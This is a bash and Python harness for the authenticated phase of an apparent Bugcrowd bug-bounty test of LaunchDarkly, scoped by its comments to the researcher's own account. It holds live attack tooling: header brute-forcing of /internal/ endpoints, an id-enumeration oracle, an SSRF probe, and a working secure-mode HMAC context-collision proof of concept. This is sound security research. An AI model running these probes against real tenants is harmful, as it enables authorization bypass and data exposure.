#!/usr/bin/env bash
# ============================================================================
# AUTHENTICATED-PHASE HARNESS — inert unless credentials are supplied.
# ============================================================================
# Activation: runs only if LD_TOKEN is set (GitHub Actions secret). With no
# credentials it prints SKIPPED and exits 0, so it can never break CI or send a
# request to LaunchDarkly by accident.
#
# REQUEST POLICY (agreed with the researcher, 2026-09-11)
#   * Default is READ-ONLY: GET requests only.
#   * The three POST-only, read-only-by-semantics /internal/ endpoints
#     (access-check/{service}/bulk, projects/{p}/flags/search) are exercised in
#     THIS phase only, because unauthenticated probing stays strictly GET-only.
#     `/internal/unauthenticated-members/organization-verifications` is EXCLUDED
#     even here: its name suggests it may create verification state (a write).
#     Enable it only with LD_ALLOW_ORG_VERIFICATION=true.
#   * No resource is created, modified or deleted unless the matching opt-in is
#     set, and then only inside OUR OWN account:
#       LD_ALLOW_RESOURCE_CREATION=true -> may create additive test resources
#       LD_ALLOW_ENV_PATCH=true         -> may PATCH our own env (secure mode on)
#       LD_ALLOW_LOGIN=true             -> may POST the login flow to obtain `ldso`
#     All three default to false. Nothing here ever touches another tenant.
#   * SSRF-style tests (assignment-data-sources/{key}/probe, datasets upload-url,
#     webhook/test-event) run ONLY if LD_SSRF_CAPTOR is set, because the program
#     requires captor metadata as proof of reach.
#   * IDOR strategy that avoids other users' data entirely: all "victim" ids come
#     from our own account (two projects/environments), or are syntactically valid
#     RANDOM ids used only to compare 403-vs-404 error text (enumeration oracle).
#
# SECRET HYGIENE
#   * The environment SDK key and the token are never written to any output file.
#     They live in shell variables only; every committed artifact is passed through
#     a redactor before it is written, and bodies are truncated.
#   * Output dir: $CI_RESULTS_DIR (default ci-results/local), subdir auth-phase.
# ============================================================================
set -uo pipefail

LD='https://app.launchdarkly.com'
UA='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0 Safari/537.36'
OUT="${CI_RESULTS_DIR:-ci-results/local}/auth-phase"
mkdir -p "$OUT/raw"
RES="$OUT/authenticated-phase.txt"
: > "$RES"

if [ -z "${LD_TOKEN:-}" ]; then
  echo "SKIPPED: LD_TOKEN secret not set — authenticated phase is inert." | tee -a "$RES"
  echo "  To activate: add LD_TOKEN (API access token for our own account) as a repo secret." | tee -a "$RES"
  echo "  See plans/account-setup-runbook.md for which secrets do what." | tee -a "$RES"
  exit 0
fi

AUTH="Authorization: Bearer ${LD_TOKEN}"
ALLOW_CREATE="${LD_ALLOW_RESOURCE_CREATION:-false}"
ALLOW_ENV_PATCH="${LD_ALLOW_ENV_PATCH:-false}"
ALLOW_LOGIN="${LD_ALLOW_LOGIN:-false}"
ALLOW_ORGVER="${LD_ALLOW_ORG_VERIFICATION:-false}"
CAPTOR="${LD_SSRF_CAPTOR:-}"
ACCOUNT_ID="${LD_ACCOUNT_ID:-}"
SECOND_TOKEN="${LD_TOKEN_SCOPED:-}"

# redact anything credential-shaped before it reaches a committed file
redact() {
  sed -e "s/${LD_TOKEN}/<REDACTED-TOKEN>/g" \
      -e 's/\("apiKey"[[:space:]]*:[[:space:]]*"\)[^"]*/\1<REDACTED-SDKKEY>/g' \
      -e 's/\(sdk-[A-Za-z0-9._-]\{6\}\)[A-Za-z0-9._-]*/\1<REDACTED>/g' \
      -e 's/ldso=[A-Za-z0-9._%+-]*/ldso=<REDACTED>/g'
}

get() { # get <label> <path> [extra curl args...]
  local label="$1" p="$2"; shift 2
  local tag; tag=$(echo "$label" | tr -c 'a-zA-Z0-9._-' '_')
  local code size
  code=$(curl -sS -D "$OUT/raw/$tag.hdr" -o "$OUT/raw/$tag.body" -w '%{http_code}' --max-time 25 \
         -A "$UA" -H "$AUTH" -H 'Accept: application/json' "$@" "$LD$p" 2>/dev/null || echo ERR)
  size=$(wc -c < "$OUT/raw/$tag.body" 2>/dev/null | tr -d ' ')
  head -c 4000 "$OUT/raw/$tag.body" | redact > "$OUT/raw/$tag.body.keep"
  mv "$OUT/raw/$tag.body.keep" "$OUT/raw/$tag.body"
  local excerpt; excerpt=$(head -c 180 "$OUT/raw/$tag.body" | tr -d '\r' | tr '\n' ' ')
  printf '%-52s %-4s %9sB  %s\n' "$label" "$code" "$size" "$excerpt" | tee -a "$RES"
  LAST_CODE="$code"; LAST_BODY="$OUT/raw/$tag.body"; LAST_TAG="$tag"
  sleep 0.3
}

say() { echo "$@" | tee -a "$RES"; }
hr()  { say ""; say "=== $* ==="; }

hr "A. who are we? (token identity, account resolution)"
get 'caller-identity' '/api/v2/caller-identity'
get 'api-v2-root' '/api/v2/'
# derive our account id from any /api/v2/account/... style link the API hands back
if [ -z "$ACCOUNT_ID" ] && [ -s "$LAST_BODY" ]; then
  ACCOUNT_ID=$(grep -oE '/api/v2/accounts?/[a-f0-9]{24}' "$LAST_BODY" 2>/dev/null | head -1 | grep -oE '[a-f0-9]{24}$' || true)
fi
say "  resolved account id: ${ACCOUNT_ID:-<not resolved from these responses>}"

hr "B. the 'account ID header' question, with a REAL value at last"
# With a real session/token the /internal/ gate should be satisfiable. Try the token alone, then
# the token plus each candidate account header carrying our REAL account id. A header name that
# flips 401 -> 200 is the answer; dummies could never show this (see findings/log.md cont. 11).
get 'internal-account (token only)' '/internal/account'
if [ -n "$ACCOUNT_ID" ]; then
  for h in ld-account ld-account-id x-ld-account x-ld-account-id account-id x-account-id \
           ld-accountid x-ld-accountid accountId; do
    get "internal-account [$h: real id]" '/internal/account' -H "$h: $ACCOUNT_ID"
  done
fi
get 'internal-config-authenticated (token only)' '/internal/config/authenticated'
get 'api-v2-projects (token only)' '/api/v2/projects?limit=5'

hr "C. our own tenant inventory (read-only; ids for the authz matrix)"
get 'projects' '/api/v2/projects?limit=20'
PROJ_KEYS=$(python3 -c "
import json,sys
try:
    d=json.load(open('$LAST_BODY',errors='ignore'))
    print(' '.join(i.get('key','') for i in d.get('items',[])[:3] if i.get('key')))
except Exception: pass" 2>/dev/null)
say "  project keys: ${PROJ_KEYS:-<none>}"
get 'environments' '/api/v2/account/environments?limit=20'
get 'members' '/api/v2/members?limit=20'
get 'teams' '/api/v2/teams?limit=20'
get 'roles-custom' '/api/v2/roles?limit=20'
get 'tokens' '/api/v2/tokens?limit=20'
get 'context-kinds' '/api/v2/account/context-kinds?limit=20'
get 'applications' '/api/v2/applications?limit=20'
get 'destinations' '/api/v2/destinations'
get 'webhooks-all' '/api/v2/webhooks?limit=20'
get 'account-usage' '/api/v2/account/usage'
get 'role-presets-bundle' '/internal/role-presets-bundle'
get 'entitlements-ai-configs' '/internal/entitlements/ai-configs'
get 'entitlements-release-guardian' '/internal/entitlements/release-guardian'
get 'internal-plans-detail' '/internal/plans'
get 'billingv2-plans' '/internal/billingv2/plans'
get 'usage-sdk-active' '/internal/usage/sdk-active'
get 'internal-actions' '/internal/actions'
get 'internal-announcements' '/internal/announcements'

FIRST_PROJ=$(echo "$PROJ_KEYS" | awk '{print $1}')
SECOND_PROJ=$(echo "$PROJ_KEYS" | awk '{print $2}')

if [ -n "$FIRST_PROJ" ]; then
  hr "D. cross-project authz INSIDE our own account (no other tenant touched)"
  get "flags-of-project-1 [$FIRST_PROJ]" "/api/v2/flags/$FIRST_PROJ?limit=5"
  if [ -n "$SECOND_PROJ" ]; then
    get "flags-of-project-2 [$SECOND_PROJ]" "/api/v2/flags/$SECOND_PROJ?limit=5"
  fi
  # A narrowly scoped token must not be able to read the other project. Skipped unless provided.
  if [ -n "$SECOND_TOKEN" ]; then
    say "  --- repeating with the restricted token (LD_TOKEN_SCOPED): expect 403 on out-of-scope reads ---"
    AUTH="Authorization: Bearer ${SECOND_TOKEN}"
    get "scoped: flags-of-project-1" "/api/v2/flags/$FIRST_PROJ?limit=5"
    [ -n "$SECOND_PROJ" ] && get "scoped: flags-of-project-2" "/api/v2/flags/$SECOND_PROJ?limit=5"
    get "scoped: members" '/api/v2/members?limit=5'
    get "scoped: tokens" '/api/v2/tokens?limit=5'
    AUTH="Authorization: Bearer ${LD_TOKEN}"
  else
    say "  skipped scoped-token matrix: set LD_TOKEN_SCOPED (a reader token limited to one project)"
    say "  to test whether scope enforcement holds. That is the cleanest privilege-escalation test"
    say "  available without ever touching another customer's data."
  fi

  hr "E. enumeration oracle: nonexistent vs random-but-valid ids"
  get 'project-nonexistent-name' '/api/v2/projects/zzz-does-not-exist-bugcrowd'
  get 'flags-of-nonexistent-project' '/api/v2/flags/zzz-does-not-exist-bugcrowd?limit=5'
  get 'account-random-24hex' '/api/v2/accounts/0123456789abcdef01234567'
  get 'member-random-24hex' '/api/v2/members/0123456789abcdef01234567'
  get 'env-random-account-random-env' '/api/v2/account/environments/0123456789abcdef01234567'
  say "  differing status/text between 'nonexistent' and 'random valid id' = enumeration oracle."

  hr "F. POST-only endpoints that are read-only by semantics (authenticated phase only)"
  get "flags-search [$FIRST_PROJ]" "/internal/projects/$FIRST_PROJ/flags/search" \
      -X POST -H 'Content-Type: application/json' -d '{"query":"","limit":5}'
  get "access-check (our project, service=gonfalon)" "/internal/authorization/access-check/gonfalon/bulk" \
      -X POST -H 'Content-Type: application/json' \
      -d "{\"header\":{\"Authorization\":\"Bearer ${LD_TOKEN}\"},\"service\":\"gonfalon\",\"body\":[{\"action\":\"read\",\"resource\":\"proj/$FIRST_PROJ\"}]}" \
      > /dev/null 2>&1 || true
  # the access-check response is redacted before it lands in the results file
  if [ -n "$LAST_TAG" ]; then
    sed -i "s/${LD_TOKEN}/<REDACTED-TOKEN>/g" "$OUT/raw"/*access-check* 2>/dev/null || true
  fi
  get "access-check (unknown service)" "/internal/authorization/access-check/zzz-not-a-service-bugcrowd/bulk" \
      -X POST -H 'Content-Type: application/json' \
      -d '{"header":{},"service":"zzz-not-a-service-bugcrowd","body":[{"action":"read","resource":"proj/x"}]}'
  say "  ^ comparing a real service name against a bogus one shows whether 'service' selects an"
  say "    internal target (confused-deputy lead L4) or is merely a label."
  if [ "$ALLOW_ORGVER" = "true" ]; then
    get 'organization-verifications' '/internal/unauthenticated-members/organization-verifications' \
        -X POST -H 'Content-Type: application/json' -d '{"email":"zazieproductions@bugcrowdninja.com"}'
  else
    say "  skipped organization-verifications (may create state; LD_ALLOW_ORG_VERIFICATION=false)"
  fi
fi

hr "G. H11 — /internal/config/authenticated with URL-derived project/environment params"
get 'config-authenticated?project+env' "/internal/config/authenticated?project=${FIRST_PROJ:-none}&environment=production"
get 'config-authenticated?project=other' "/internal/config/authenticated?project=${SECOND_PROJ:-none}&environment=production"
get 'config-authenticated?project=bogus' '/internal/config/authenticated?project=zzz-does-not-exist-bugcrowd&environment=production'
say "  ^ if a bogus or cross-project value returns 200 with data, the server is not authorizing"
say "    the URL-derived params (H11)."

hr "H. F-002 DEFINITIVE TEST on our own environment (secure mode + real SDK key)"
# Our own env's clientSideId and apiKey are readable with our own token; the SDK key is used only
# in-process to compute the two HMACs and is never written out.
python3 - "$OUT" "$LD" "$OUT/raw" <<'PY' 2>&1 | tee -a "$RES"
import base64, hashlib, hmac, json, os, subprocess, sys, urllib.request
out, LD, raw = sys.argv[1], sys.argv[2], sys.argv[3]
tok = os.environ.get('LD_TOKEN', '')
envf = os.path.join(raw, 'environments.body')
if not os.path.exists(envf):
    print("  no environment list captured — skipping"); raise SystemExit(0)
try:
    envs = json.load(open(envf, errors='ignore')).get('items', [])
except Exception as e:
    print(f"  could not parse environments ({e}) — skipping"); raise SystemExit(0)
env = next((e for e in envs if e.get('clientSideId') and e.get('apiKey')), None)
if not env:
    print("  no environment with clientSideId+apiKey — skipping"); raise SystemExit(0)
csid, sdkkey = env['clientSideId'], env['apiKey']
print(f"  environment           : {env.get('key')} (project {env.get('projectKey')})")
print(f"  clientSideId          : {csid}")
print(f"  secureMode enabled    : {env.get('secureMode')}")
print(f"  apiKey                : <held in memory only, {len(sdkkey)} chars, never written out>")

def enc(k): return k.replace('%', '%25').replace(':', '%3A') if ('%' in k or ':' in k) else k
def ckey(c):
    if c.get('kind') == 'multi':
        return ':'.join(f"{k}:{enc(c[k]['key'])}" for k in sorted(x for x in c if x != 'kind'))
    if c.get('kind', 'user') == 'user': return c['key']
    return f"{c['kind']}:{enc(c['key'])}"
def b64(o): return base64.urlsafe_b64encode(json.dumps(o, separators=(',', ':')).encode()).decode().rstrip('=')
def H(c): return hmac.new(sdkkey.encode(), ckey(c).encode(), hashlib.sha256).hexdigest()

K = 'bugcrowd-f002-test-key'
A = {"kind": "user", "key": f"org:{K}:user:{K}"}                      # single-kind user
B = {"kind": "multi", "org": {"key": K}, "user": {"key": K}}          # colliding multi-context
C = {"kind": "user", "key": "bugcrowd-unrelated-control"}             # must be rejected
print(f"  canonicalKey(A)       : {ckey(A)}")
print(f"  canonicalKey(B)       : {ckey(B)}")
print(f"  local collision       : {ckey(A) == ckey(B)}   identical HMAC: {H(A) == H(B)}")

def probe(label, ctx, h=None, extra=''):
    url = f"{LD}/sdk/evalx/{csid}/contexts/{b64(ctx)}"
    if h: url += f"?h={h}"
    if extra: url += ('&' if '?' in url else '?') + extra
    req = urllib.request.Request(url, headers={'User-Agent': 'bugcrowd-research/1.0'})
    try:
        with urllib.request.urlopen(req, timeout=25) as r:
            body = r.read(); code = r.status
    except urllib.error.HTTPError as e:
        body = e.read(); code = e.code
    except Exception as e:
        print(f"  {label:34} ERR {e}"); return
    exc = body[:160].decode('utf-8', 'replace').replace('\n', ' ')
    print(f"  {label:34} {code}  {len(body):>7}B  {exc}")

print("  --- live probes against our own environment (values are ours; bodies truncated) ---")
probe('A user-kind + h(A)', A, H(A))
probe('B multi-kind + h(A)  <-- collision', B, H(A))
probe('B multi-kind + h(B)', B, H(B))
probe('C unrelated + h(A)   <-- control', C, H(A))
probe('A user-kind, NO h', A)
probe('B multi-kind + h(A) + withReasons', B, H(A), 'withReasons=true')
print("  INTERPRETATION")
print("    secureMode=true and the collision probe returns 200 while the control is 4xx")
print("      => F-002 confirmed server-side on our own tenant (hash signed for A accepted for B).")
print("    secureMode=false => enable it in the UI for this environment and re-run, or set")
print("      LD_ALLOW_ENV_PATCH=true to let the harness PATCH our own env (reversible).")
PY

if [ "$ALLOW_ENV_PATCH" = "true" ]; then
  say "  LD_ALLOW_ENV_PATCH=true: enabling secure mode on our own environment (reversible)"
  get 'patch-env-securemode' "/api/v2/account/environments/${FIRST_PROJ:+$FIRST_PROJ}/production" \
      -X PATCH -H 'Content-Type: application/json' -H 'LD-API-Version: beta' \
      -d '[{"op":"replace","path":"/secureMode","value":true}]'
else
  say "  (LD_ALLOW_ENV_PATCH is false; the harness never modifies the environment itself)"
fi

hr "I. SSRF-capable endpoints (only with a captor; program requires proof-of-reach metadata)"
if [ -n "$CAPTOR" ]; then
  get "assignment-data-source-probe [$FIRST_PROJ]" "/internal/projects/${FIRST_PROJ}/assignment-data-sources/zzz/probe" \
      -X POST -H 'Content-Type: application/json' -d "{\"url\":\"$CAPTOR\"}"
  say "  captor responses/metadata must be attached to any SSRF report."
else
  say "  skipped: LD_SSRF_CAPTOR not set. No SSRF claim is possible without captor metadata,"
  say "  and the program requires it, so these endpoints are not touched."
fi

hr "J. login/session path (opt-in; creates a session = a write)"
if [ "$ALLOW_LOGIN" = "true" ] && [ -n "${LD_LOGIN_EMAIL:-}" ] && [ -n "${LD_LOGIN_PASSWORD:-}" ]; then
  say "  LD_ALLOW_LOGIN=true — performing the documented login flow to obtain an ldso cookie,"
  say "  then comparing cookie-authenticated /internal/ responses against token-authenticated ones."
  say "  (Not implemented in this version: deliberately left as a manual step to avoid storing or"
  say "   transmitting a password from CI. See plans/account-setup-runbook.md §5.)"
else
  say "  skipped: LD_ALLOW_LOGIN=false (default). Cookie-based behaviour stays untested by design."
fi

say ""
say "authenticated phase done -> $OUT"
say "  opt-in switches seen: create=$ALLOW_CREATE env_patch=$ALLOW_ENV_PATCH login=$ALLOW_LOGIN orgver=$ALLOW_ORGVER captor=$([ -n "$CAPTOR" ] && echo set || echo unset)"
# final redaction sweep over everything we are about to commit
grep -rlZ . "$OUT" 2>/dev/null | xargs -0 -r sed -i \
  -e "s/${LD_TOKEN}/<REDACTED-TOKEN>/g" \
  -e 's/\(sdk-[A-Za-z0-9._-]\{6\}\)[A-Za-z0-9._-]*/\1<REDACTED>/g' \
  -e 's/ldso=[A-Za-z0-9._%+-]*/ldso=<REDACTED>/g' 2>/dev/null || true
[ -n "$SECOND_TOKEN" ] && grep -rlZ . "$OUT" 2>/dev/null | xargs -0 -r sed -i "s/${SECOND_TOKEN}/<REDACTED-TOKEN2>/g" 2>/dev/null || true
say "  redaction sweep complete (token/sdk-key/session-cookie patterns)"
